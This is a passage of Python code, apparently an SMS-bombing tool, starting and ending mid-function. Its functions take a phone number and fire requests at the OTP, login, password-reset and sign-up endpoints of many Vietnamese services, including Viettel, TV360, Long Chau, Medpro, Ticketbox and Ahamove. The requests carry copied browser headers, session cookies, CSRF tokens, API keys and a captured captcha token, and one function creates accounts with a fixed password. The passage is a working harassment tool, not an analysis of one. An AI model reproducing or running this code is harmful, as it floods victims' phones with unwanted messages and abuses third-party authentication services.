        '_ga_D7L53J0JMS': 'GS1.1.1701425062.1.1.1701425073.49.0.0',
        '_ga_E5YP28Y8EF': 'GS1.1.1701425062.1.1.1701425073.0.0.0',
        'session-id': 's%3A8e2af17c-0fb4-41fa-bec5-04c87175fe13.LNRhk8hdOWKBn5vsRzQgDTC9qek4xJZkq%2BzgpbYjfx8',
    }

    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'acw_tc=f1a08ff1fbc861b0b3cf5f6560c6d2f61cc1f49ebd7ec4fdd09660977ad81c23; img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d4a779ab-14fc-4887-91fc-b1a14b30a2e6.yUg55IGhm5oozKBmXxwZjYrSl3ZpHtOEO55WRRCKkpI; shared-device-id=web_d4a779ab-14fc-4887-91fc-b1a14b30a2e6; screen-size=s%3A1600x900.D5hmv7jHev4y5hX3B2q622HuIeLv2TWEm7OgzGkxojg; _ga=GA1.2.1336579171.1701425063; _gid=GA1.2.1702255266.1701425063; _gat_UA-180935206-1=1; G_ENABLED_IDPS=google; _ga_D7L53J0JMS=GS1.1.1701425062.1.1.1701425073.49.0.0; _ga_E5YP28Y8EF=GS1.1.1701425062.1.1.1701425073.0.0.0; session-id=s%3A8e2af17c-0fb4-41fa-bec5-04c87175fe13.LNRhk8hdOWKBn5vsRzQgDTC9qek4xJZkq%2BzgpbYjfx8',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1701425074027',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"msisdn":"0352047894"}'
    #response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, data=data)

def viettel_live(phone):
    cookies = {
        'laravel_session': 'RKYUiOJqdm1X8wunOtWeMuibCd8mchqmVUi4z1Ig',
        '_fbp': 'fb.1.1701426364985.1710521207',
        'redirectLogin': 'https://viettel.vn/',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWkWV-cWbTFYYQ1-w-2LmA28O2sgeTK1O0YWxMb.1',
        'XSRF-TOKEN': 'eyJpdiI6ImtUTEN5bzFHM0liWU1EVkl1MFEwOVE9PSIsInZhbHVlIjoiU0dJVzZmdEt2SFRETWZyK3hDeVkxTEFhQklqS0tVQW5xa2pPbXN5bFI5TFYxeE8rb1Z6b21ndXJ3KzJOancrMyIsIm1hYyI6Ijg1NTM3YjBlNmYwZjVjNjAyZDRhMjIxMmFmMTcxNmIyMTJiODNiMWU2YTg4YTMyMzI2MTVmOGMyNzQwYjIyZjMifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=RKYUiOJqdm1X8wunOtWeMuibCd8mchqmVUi4z1Ig; _fbp=fb.1.1701426364985.1710521207; redirectLogin=https://viettel.vn/; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWkWV-cWbTFYYQ1-w-2LmA28O2sgeTK1O0YWxMb.1; XSRF-TOKEN=eyJpdiI6ImtUTEN5bzFHM0liWU1EVkl1MFEwOVE9PSIsInZhbHVlIjoiU0dJVzZmdEt2SFRETWZyK3hDeVkxTEFhQklqS0tVQW5xa2pPbXN5bFI5TFYxeE8rb1Z6b21ndXJ3KzJOancrMyIsIm1hYyI6Ijg1NTM3YjBlNmYwZjVjNjAyZDRhMjIxMmFmMTcxNmIyMTJiODNiMWU2YTg4YTMyMzI2MTVmOGMyNzQwYjIyZjMifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'NoFDffGLuOtjK0wumyvE50Rm2gE6jsGaxFk2QXbU',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImtUTEN5bzFHM0liWU1EVkl1MFEwOVE9PSIsInZhbHVlIjoiU0dJVzZmdEt2SFRETWZyK3hDeVkxTEFhQklqS0tVQW5xa2pPbXN5bFI5TFYxeE8rb1Z6b21ndXJ3KzJOancrMyIsIm1hYyI6Ijg1NTM3YjBlNmYwZjVjNjAyZDRhMjIxMmFmMTcxNmIyMTJiODNiMWU2YTg4YTMyMzI2MTVmOGMyNzQwYjIyZjMifQ==',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"msisdn":"0352047894"}'
    #response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, data=data)
def dongcre_live(phone):
    cookies = {
        '_gcl_au': '1.1.1477140118.1701436747',
        '_gid': 'GA1.2.2146111195.1701436747',
        '_tt_enable_cookie': '1',
        '_ttp': '-oAsFr6nCpOBxQWxVxQN2HqP4qz',
        '_fbp': 'fb.1.1701436747779.1814162275',
        '_ym_uid': '1701436749901806923',
        '_ym_d': '1701436749',
        '_ym_isad': '2',
        '_ym_visorc': 'b',
        '_ga_P2783EHVX2': 'GS1.1.1701436747.1.1.1701437303.39.0.0',
        '_ga': 'GA1.2.1440840162.1701436747',
        '_gat_UA-151110385-1': '1',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_gcl_au=1.1.1477140118.1701436747; _gid=GA1.2.2146111195.1701436747; _tt_enable_cookie=1; _ttp=-oAsFr6nCpOBxQWxVxQN2HqP4qz; _fbp=fb.1.1701436747779.1814162275; _ym_uid=1701436749901806923; _ym_d=1701436749; _ym_isad=2; _ym_visorc=b; _ga_P2783EHVX2=GS1.1.1701436747.1.1.1701437303.39.0.0; _ga=GA1.2.1440840162.1701436747; _gat_UA-151110385-1=1',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    json_data = {
        'login': phone,
        'trackingId': 'l9FIEsGtLSf4ggvRtjG5HNcUxqwna4N4Qh9DLCuFboePgpRlF3Sc9H1tNJd5kE5V',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"login":"0989718154","trackingId":"l9FIEsGtLSf4ggvRtjG5HNcUxqwna4N4Qh9DLCuFboePgpRlF3Sc9H1tNJd5kE5V"}'
    #response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, data=data)
def ahamove_live(phone):
    headers = {
        'authority': 'api.ahamove.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://app.ahamove.com',
        'referer': 'https://app.ahamove.com/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobile': phone,
        'country_code': 'VN',
        'firebase_sms_auth': True,
    }

    response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"mobile":"0352047894","country_code":"VN","firebase_sms_auth":true}'
    #response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, data=data)
def sely_live(phone):
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'App-Version': '1.0.0',
        'App-Version-Code': '10000',
        'BROWSER-NAME': 'Chrome',
        'BROWSER-VERSION': '125',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'DEVICE-TYPE': 'browser',
        'Origin': 'https://selly.vn',
        'PLATFORM': 'Web',
        'Referer': 'https://selly.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'os-name': 'Browser',
        'os-version': '10',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': '+84' + phone[1:],
        'forceSendSms': True,
        'checksum': '8539e0f677a98bd1bac1f9c50992363b95b36abe',
    }

    response = requests.post('https://app-api.selly.vn/users/request-otp', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phone":"+84352047894","forceSendSms":true,"checksum":"8539e0f677a98bd1bac1f9c50992363b95b36abe"}'
    #response = requests.post('https://app-api.selly.vn/users/request-otp', headers=headers, data=data)
def longchau_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': phone,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
def medpro_live(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://id.medpro.vn',
        'Referer': 'https://id.medpro.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'appid': 'medpro',
        'cskhtoken': '',
        'locale': '',
        'momoid': '',
        'osid': '',
        'ostoken': '',
        'partnerid': 'medpro',
        'platform': 'pc',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fullname': 'người dùng medpro',
        'deviceId': '4878ec81b072b0a77568cf0846bf2aa1',
        'phone': phone,
        'type': 'password',
        'captchaResponse': '03AFcWeA52xRtHHv0gPXLUAzbH9obb7haXByv_kvmV_RmucZnr1XgrYRrtI7I41EMTBIAYXSIotlmv23YUvvukP7cWV8O3UKdxEpguzfMNa2HMhfHsWEKJ4lB5blJHTQZ2FUlH4qHq5iw1lzqb_7PZStoR3pGjziV5KGShxIDb5ouZQVBUiRsDFSCqnWC7y_4OsRRRb2_i448VK2ssjyDD_O6mvl29klSnegt3f5QtMpLLZbaVPBNYB50ufITSCeznKkzN0sks09rlZRijW3x9EWcsAe5dkiPObNXXEy_Cxf0enfDVGDdlhL85kouE20PHZShqqACC89qrZD3j3b2_FgoICbaIBB2Fvmfpi2e9mQzl8TXEysaJ6kXnsg-zsvp3dcpFdoKpcrFJlrLb9fjU752sAcWEyKoXrK9wUT6MEjWX0KnvLccNp6jFlODBAjRP6WmHja_A8jfClNzyfYMfZDL9iht6TrGU8NM5_7efonjUweSSSI53tk9xJMyvFKlBGSYvUuuNq9oz6G3jJfWZ-90taW0YPwY2wsIL8aEbCj9GIJFV9mv-Tgpi3jHTK3Nv48M0tCYceuAdpP5oQA1JOX3lKwfj37ibapHMzCB6SckIHKrZJhDlSw9z5WXH6rIF3XHzTqbgYo3DMIsJnKmFuUxHduyuSd7U_fsQl0ppkIbvvI-hux3ZGSFA54mtrmH-bvISX0wArALZkPOkD49Qcn1X5pjdp7fZAdQ3PGBAKN7Tfz3PWV5PXeo8FxhM45P3f_xLIVzxU74GV3wYQMl2OzPW-ysgwnZ8B8-36JZ24GtoHPU4Hq5UpbLTLd4-oB35Jei4gc50kJcOBh5IJbPlk1o7HYSIcjOsKlNCRXFR7pbEabahUKQadS6IWAT_RO38vfbdZ1LI3Gp7zibDr9MdHPdd5AvmxVao7hBIXCkTlQMC8MlrLF01egNT9fXN7nl8KU_uMQi5CscKAqMuYxrbWaZammfPdW4HYcWmXIPgCixIIRLuZZlsi1yLaVRTAv0OCAj1vI_jhSOpbxPiVs1kVT3rEYiydrN8kBefv8YzwpFKJEDxNgWfphbNFh5jAF3xPnoTuz15Wv3Kc4_-tULSqRl6udf9EFr0kQRc9I18BxH7PLc1znSO9Fzp--Vhq-krfqdyQWmJV2_W8ozfrQrD3TuRUbSQ5CutNlOGh9HjvHmjoC4xli34UxA4wBgMGKVhkAOJ09o1GndLmA1fTXSq8DhZVJNaeBRtp6hoMF4i7MQmgSmRjGjnyqK8DIFkSpMN9VZT0ZGINhWhJOzn8T0uEJckvJfb0LYRmsGKiYNOUcYVeKBxAWhtCYdmuhOPvTMoMb8nYFe-AKuJ9xTQnoWW9-g-PA4kCEjgFHVhHjFonPnm2Fviw9sVe5Bb27cAw1O84Rc7PHE7sHl_wFlQqkeu0tTPVCPa2oL5-vhSQAVjG1-VtRJ6YCquJx0UCqZYlfgftfcEOHP6U4cwTNSpYCCPZLIZC3adrNTqxMvgihl9g1kOUIgn9eEQ4UJQw1QUF1Rz8QKHzvWNgdPnbMYzvybNSa_RyGWOpGkmTBiq_aXieiNZux2mCOB_f3aaTqd3E7uz686h5eu_SLbvjWy6U1eIRfWoAk9r6zbYB9BBlLTPgzJl_hBK5S_baiZniyTY91It6iUm5Q4MuK51n_4d_QbttvA--x6a2_e7n8Hn9uzN56sACixwFNil0uKP3cBm7bihQUuCKy8LuYXSX59a9CsRx52Q_9jdYEt4Jw',
    }

    response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"fullname":"người dùng medpro","deviceId":"d7a5ff5e953a0c6296217481b5e45cbd","phone":"0989718154","type":"password"}'.encode()
    #response = requests.post('https://api-v2.medpro.com.vn/user/phone-register', headers=headers, data=data)
def fm_live(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'authorization': 'Bearer',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://fm.com.vn',
    'priority': 'u=1, i',
    'referer': 'https://fm.com.vn/',
    'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
    'x-emp': '',
    'x-fromweb': 'true',
    'x-requestid': '03f0f69d-77ff-4484-b322-e2f22d42f208',
    }

    json_data = {
    'Phone': phone,
    'LatOfMap': '106',
    'LongOfMap': '108',
    'Browser': '',
    }

    response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
def cira_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'origin': 'https://circa.vn',
        'priority': 'u=1, i',
        'referer': 'https://circa.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': {
            'country_code': '84',
            'phone_number': phone[1:],
        },
    }

    response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
def ticket_live(phone):
    headers = {
        'accept': '*/*',
        'accept-language': 'en',
        'content-type': 'application/json',
        'origin': 'https://ticketbox.vn',
        'priority': 'u=1, i',
        'referer': 'https://ticketbox.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'x-tb-access-token': '',
        'x-tb-device-token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhcGkudGlja2V0Ym94LnZuIiwiZXhwIjoxNzE4NzY2NDU1LCJpYXQiOjE3MTYxNzQ0NTUsImlzcyI6ImlkZW50aXR5LnRpY2tldGJveC52biIsImRldmljZV9pZCI6IjYzMzEyYTI3Mzc5NGNhOGIzMTVlMjUwMTY1ZTk1OGVjIiwia2luZCI6ImRldmljZV90b2tlbiJ9.qgEgPGnCZYsGS2BNgo2yjyGId9AzNhiNSDMQOwAoWss8dgLF5e6UzquY9TnvobOQxeUbAqq5lZXmCTsrT5HbiqC1Y8KBMbfeYg8MA4jl4WXJxuFLbSHCOJABJFXA-CT7NWwpQHQt-4PVkUOpOzQ3etncRI88mOWZ0VS0IqOiVU_H3M2YISvZAO2PxZm8CUAHZHz8_m74SdDm1HbGnso9vRnNAs6R6YnbkpFVmJp_5buQ5vzyn4-Fq-7r7N_p5gF0YD0kuBDCQv5ZxFtRCUC4VoGPsMS8Rs8kiTF0fu8OwZR9D6LUwAwydJuePhDUCk1E7Gxm9XABsBhkabAEX-Np-g',
    }

    json_data = {
        'phone': '+84'+phone,
    }

    response = requests.post('https://api-movie.ticketbox.vn/v1/users/otps/send', headers=headers, json=json_data)
def pico_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
        'channel': 'b2c',
        'content-type': 'application/json',
        'origin': 'https://pico.vn',
        'party': 'ecom',
        'platform': 'Desktop',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'uuid': 'e7ef46bf11514111806e2e01eb4facf4',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)
def medlatec_live(phone):
	url = "https://medlatec.vn/auth/register/"
	url2 = "https://medlatec.vn/auth/validuserandsendotp/"

	payload = f"PhoneOrEmail={phone}&Password=%40vrxx1337&ConfirmPassword=%40vrxx1337"
	payload2 = f"PhoneOrEmail={phone}"
		
	headers = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://medlatec.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://medlatec.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": ".Smart.Antiforgery=CfDJ8DSG0bZeGvBGgSvDw88CXjbNYTlI6Ldkx_yoUTzCCIW-Ekh_TjXIx0GukMH4QqUXICnd8iQQuaJWkC3p86mPkBIBu6wdKIyQetHeIgtUCpGiz8rdCMd0LJ0HM9UrEPuObzlsS9zHP0qUSyIQQOkIygc; SERVERID=web43_1; _gid=GA1.2.213543563.1716264251; _gat_gtag_UA_20501699_10=1; _gcl_au=1.1.1090483214.1716264252; _ga_8KSQHM905V=GS1.1.1716264257.1.0.1716264257.60.0.0; _ga=GA1.1.2079127711.1716264251; _clck=1lugyr3%7C2%7Cfly%7C0%7C1602; _fbp=fb.1.1716264259105.813249323812401752; __zi=2000.SSZzejyD5TilXl6ptW9QsIJ7y-V0J5J1PflXxTvU5jDmYUwprrzIcd28vxxLMb7US8hbzDLKLjjtXU7rC0.1; _ga_WQB0JY55Q6=GS1.1.1716264263.1.0.1716264263.60.0.0; _clsk=1hq5m2q%7C1716264264936%7C1%7C0%7Ck.clarity.ms%2Fcollect; _ga_307151563=GS1.1.1716264268.1.0.1716264268.0.0.34254185; FCNEC=%5B%5B%22AKsRol-H6z75Ouz-UZyjWDDRPFNm6WWzebmssmjoWlL-VfD6JGhrnC79QqnL4FqVNvBREa-aVRAVE1ZijRn5VSHeu15TMNr3FGr8MgCjnvfe0u-fdFRgjxv99vKCvBcOt_uPwfT1k3lb_p8kRP9moMW4g00A_UEaeg%3D%3D%22%5D%5D"
	}
	
	headers2 = {
		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
		"X-Requested-With": "XMLHttpRequest",
		"sec-ch-ua-mobile": "?1",
		"sec-ch-ua-platform": "\"Android\"",
		"Origin": "https://medlatec.vn",
		"Sec-Fetch-Site": "same-origin",
		"Sec-Fetch-Mode": "cors",
		"Sec-Fetch-Dest": "empty",
		"Referer": "https://medlatec.vn/",
		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
		"Cookie": "_gid=GA1.2.213543563.1716264251; _gcl_au=1.1.1090483214.1716264252; _clck=1lugyr3%7C2%7Cfly%7C0%7C1602; _fbp=fb.1.1716264259105.813249323812401752; __zi=2000.SSZzejyD5TilXl6ptW9QsIJ7y-V0J5J1PflXxTvU5jDmYUwprrzIcd28vxxLMb7US8hbzDLKLjjtXU7rC0.1; .Smart.Antiforgery=CfDJ8Plro6dSv7NCk_e9BQh5x74pQYaQjz-CWhS_S05JloXJhY8tyE0gHmoB7KYhZUZSYzbYYaE4rKUXY9kzSSJw91zmXffLDXtUqP_aeP9Brq5x2kczWL8qE3hG1PdqnB6KfGRMJ3BU49PB2YlboTn3L64; SERVERID=web43_3; _ga_WQB0JY55Q6=GS1.1.1716264263.1.1.1716264526.60.0.0; _ga_307151563=GS1.1.1716264268.1.1.1716264526.0.0.1513059950; _gat_gtag_UA_20501699_10=1; _ga_8KSQHM905V=GS1.1.1716264257.1.1.1716264527.60.0.0; _ga=GA1.1.2079127711.1716264251; _clsk=qwdm4i%7C1716264533518%7C1%7C1%7Ck.clarity.ms%2Fcollect; FCNEC=%5B%5B%22AKsRol_jV8XWd_t2Vh4BeZZz_Xv-zIFAZ6SBhQFvG0Krw82AKAzx4nF0WrGCNwgELyVu8PS369PYE8e769pQXIoXTCBUPdJ6ZvNpYmCgPUAquFJeGfex9qvSRPgWMw0163TsKI1ZKPYNaEMe7Xjsg_z-PuoqrJseXA%3D%3D%22%5D%5D"
	}
		
	response = requests.post(url, data=payload, headers=headers)
	
	if "RegisterFailOn" in response.text:
		response = requests.post(url2, data=payload2, headers=headers2)
def rebook_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'ccdac84fd9458cd196b3a61247c03b3d',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1716175016472',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    json_data = {
        'phoneNumber': '84'+phone,
    }

    response = requests.post(
        'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
def pico_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
        'channel': 'b2c',
        'content-type': 'application/json',
        'origin': 'https://pico.vn',
        'party': 'ecom',
        'platform': 'Desktop',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'uuid': 'e7ef46bf11514111806e2e01eb4facf4',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers, json=json_data)
def ghn_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
